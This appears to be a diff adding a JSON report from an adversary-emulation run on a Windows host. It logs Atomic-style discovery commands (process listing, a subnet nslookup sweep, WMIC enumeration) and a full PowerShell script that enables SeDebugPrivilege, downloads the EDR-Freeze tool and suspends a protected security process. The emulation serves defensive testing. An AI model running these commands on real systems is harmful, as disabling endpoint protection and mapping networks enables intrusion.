+      "finish": "2026-04-01T13:49:59Z",
+      "ability": {
+        "ability_id": "1ddf2b8ee6a56ce9f9132a168947653e",
+        "tactic": "discovery",
+        "technique_name": "Process Discovery",
+        "technique_id": "T1057",
+        "name": "Process Discovery - get-wmiObject",
+        "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "get-wmiObject -class Win32_Process",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.atomic.app.parsers.atomic_powershell",
+                "parserconfigs": [
+                  {
+                    "source": "validate_me",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {}
+                  }
+                ]
+              }
+            ],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "get-wmiObject -class Win32_Process",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.atomic.app.parsers.atomic_powershell",
+            "parserconfigs": [
+              {
+                "source": "validate_me",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {}
+              }
+            ]
+          }
+        ],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:49:56Z"
+    },
+    {
+      "id": "df1d26c3-c085-4813-bb17-d920f9c573a3",
+      "paw": "fgdafj",
+      "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+      "plaintext_command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:50:02Z",
+      "pin": 0,
+      "pid": "8116",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "df1d26c3-c085-4813-bb17-d920f9c573a3",
+      "collect": "2026-04-01T13:50:53Z",
+      "finish": "2026-04-01T13:51:06Z",
+      "ability": {
+        "ability_id": "13a0c78dbd8d3645db69540bfe7cd038",
+        "tactic": "discovery",
+        "technique_name": "Remote System Discovery",
+        "technique_id": "T1018",
+        "name": "Remote System Discovery - nslookup",
+        "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.atomic.app.parsers.atomic_powershell",
+                "parserconfigs": [
+                  {
+                    "source": "validate_me",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {}
+                  }
+                ]
+              }
+            ],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.atomic.app.parsers.atomic_powershell",
+            "parserconfigs": [
+              {
+                "source": "validate_me",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {}
+              }
+            ]
+          }
+        ],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:50:53Z"
+    },
+    {
+      "id": "4c394a86-3166-41e1-83c4-0efe8e65af3b",
+      "paw": "fgdafj",
+      "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+      "plaintext_command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:51:06Z",
+      "pin": 0,
+      "pid": "212",
+      "facts": [
+        {
+          "unique": "host.ip.address9.17.9.4",
+          "trait": "host.ip.address",
+          "name": "host.ip.address",
+          "value": "9.17.9.4",
+          "created": "2026-04-01T13:51:49Z",
+          "score": 1,
+          "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+          "origin_type": "LEARNED",
+          "links": [
+            "4c394a86-3166-41e1-83c4-0efe8e65af3b"
+          ],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [
+            "fgdafj"
+          ],
+          "technique_id": "T1082"
+        }
+      ],
+      "relationships": [],
+      "used": [],
+      "unique": "4c394a86-3166-41e1-83c4-0efe8e65af3b",
+      "collect": "2026-04-01T13:51:48Z",
+      "finish": "2026-04-01T13:51:49Z",
+      "ability": {
+        "ability_id": "7d0acfc367ef432554f480d6e8c22c7c",
+        "tactic": "discovery",
+        "technique_name": "System Information Discovery",
+        "technique_id": "T1082",
+        "name": "System Information Discovery with WMIC",
+        "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
+        "executors": [
+          {
+            "name": "cmd",
+            "platform": "windows",
+            "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "discovery"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "cmd",
+        "platform": "windows",
+        "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [],
+        "cleanup": [],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 0,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:51:48Z"
+    },
+    {
+      "id": "1b436085-7ede-4e12-89e0-858ced033a6a",
+      "paw": "fgdafj",
+      "command": "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\"",
+      "plaintext_command": "",
+      "status": 1,
+      "score": 0,
+      "decide": "2026-04-01T13:51:52Z",
+      "pin": 0,
+      "pid": "1584",
+      "facts": [],
+      "relationships": [],
+      "used": [],
+      "unique": "1b436085-7ede-4e12-89e0-858ced033a6a",
+      "collect": "2026-04-01T13:52:39Z",
+      "finish": "2026-04-01T13:52:41Z",
+      "ability": {
+        "ability_id": "54ebf8b23105d20c98156afd96b97c81",
+        "tactic": "defense-evasion",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "technique_id": "T1562.001",
+        "name": "Freeze PPL-protected process with EDR-Freeze",
+        "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
+        "executors": [
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "module": "plugins.atomic.app.parsers.atomic_powershell",
+                "parserconfigs": [
+                  {
+                    "source": "validate_me",
+                    "edge": "",
+                    "target": "",
+                    "custom_parser_vals": {}
+                  }
+                ]
+              }
+            ],
+            "cleanup": [
+              "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+            ],
+            "variations": [],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": null,
+        "repeatable": false,
+        "buckets": [
+          "defense-evasion"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "atomic",
+        "delete_payload": true
+      },
+      "executor": {
+        "name": "psh",
+        "platform": "windows",
+        "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+        "code": null,
+        "language": null,
+        "build_target": null,
+        "payloads": [],
+        "uploads": [],
+        "timeout": 60,
+        "parsers": [
+          {
+            "module": "plugins.atomic.app.parsers.atomic_powershell",
+            "parserconfigs": [
+              {
+                "source": "validate_me",
+                "edge": "",
+                "target": "",
+                "custom_parser_vals": {}
+              }
+            ]
+          }
+        ],
+        "cleanup": [
+          "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+        ],
+        "variations": [],
+        "additional_info": {}
+      },
+      "cleanup": 1,
+      "visibility": {
+        "score": 50,
+        "adjustments": []
+      },
+      "host": "WS10",
+      "output": "True",
+      "deadman": false,
+      "agent_reported_time": "2026-04-01T13:52:40Z"
+    }
+  ],
+  "potential_links": [],
+  "event_logs": [],
+  "diagnostics": {
+    "api_mode": "v2",
+    "operation_id": "ca25eccc-1615-463f-92e7-c885e9915d59",
+    "operation_name": "apt-sim-20260401-154524",
+    "operation_state": "finished",
+    "selected_agent_paw": "fgdafj",
+    "selected_group": "red",
+    "host_group_count": 1,
+    "compatible_count": 8,
+    "referenced_ability_count": 8,
+    "links_total": 9,
+    "links_relevant_to_selected_agent": 9,
+    "potential_links_total": 0,
+    "event_logs_total": 0,
+    "report_present": false,
+    "link_status_counts": {
+      "0": 2,
+      "1": 7
+    },
+    "errors": {},
+    "probable_causes": [
+      "Operation in stato finished, non propriamente in esecuzione."
+    ]
+  }
+}
